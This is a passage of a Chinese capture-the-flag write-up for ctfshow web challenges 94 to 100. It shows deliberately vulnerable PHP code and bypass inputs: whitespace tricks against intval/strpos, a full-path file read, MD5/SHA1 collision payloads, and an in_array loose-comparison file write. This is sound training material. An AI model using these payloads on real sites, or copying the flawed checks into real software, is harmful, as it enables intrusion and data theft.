class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>strpos () f 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>\n<p>那就继续小数点解决，第一次出现的位置，加一个空格干扰一下就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110001332708.png\" alt=\"image-20221110001332708\" /></p>\n<h2 id=\"web95\"><a class=\"anchor\" href=\"#web95\">#</a> web95</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>小数点被加入黑名单了，那就使用空格干扰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003134354.png\" alt=\"image-20221110003134354\" /></p>\n<h2 id=\"web96\"><a class=\"anchor\" href=\"#web96\">#</a> web96</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里先引出报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003333642.png\" alt=\"image-20221110003333642\" /></p>\n<p>看到文件路径，这里传入完整路径就可以了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>u<span class=\"token operator\">=</span><span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>flag<span class=\"token operator\">.</span>php</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003509585.png\" alt=\"image-20221110003509585\" /></p>\n<h2 id=\"web97\"><a class=\"anchor\" href=\"#web97\">#</a> web97</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'Wrong.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>人见人爱的 MD5 强碰撞，这里给出几个 MD5 和 hash 的强碰撞，简单点的数组绕过就行</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#0</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>#1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>#2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>#3</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>$a=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>$b=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>#4</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>POST：</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0&amp;array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>#sha1</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>POST:</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</pre></td></tr></table></figure><p>传就完事，注意别用 hackbar 会编码一次再发送</p>\n<h2 id=\"web98\"><a class=\"anchor\" href=\"#web98\">#</a> web98</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_FLAG'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">:</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>三元运算符和地址传递</p>\n<p>首先第一个三元运算，如果有 get 传参就将 post 的地址传给 get，最后一个是如果 $_GET ['HTTP_FLAG']=='flag' 就打印 flag，否则就会高亮当前文件，第二个和第三个这里似乎没有用上</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110225715098.png\" alt=\"image-20221110225715098\" /></p>\n<h2 id=\"web99\"><a class=\"anchor\" href=\"#web99\">#</a> web99</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$allow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">36</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x36d</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$allow</span><span class=\"token punctuation\">,</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>array_push () 函数向数组尾部插入一个或多个元素。</p>\n<p>in_array () 函数搜索数组中是否存在指定的值。这题的点也是在这这个函数有三个参数，像题目中两个是必须的，第三个参数是可选择的如果为 ture 则判断第一个参数（被检索的值）和第二个参数（检索的字母）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233741927.png\" alt=\"image-20221110233741927\" /></p>\n<p>这里可以，用 1.php 去尝试，会被识别为 1，如果相同则写入 1.php 中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233730400.png\" alt=\"image-20221110233730400\" /></p>\n<h2 id=\"web100\"><a class=\"anchor\" href=\"#web100\">#</a> web100</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ctfshow.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag in class ctfshow;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$v1</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$v2</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$v3</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$v0</span><span class=\"token operator\">=</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span 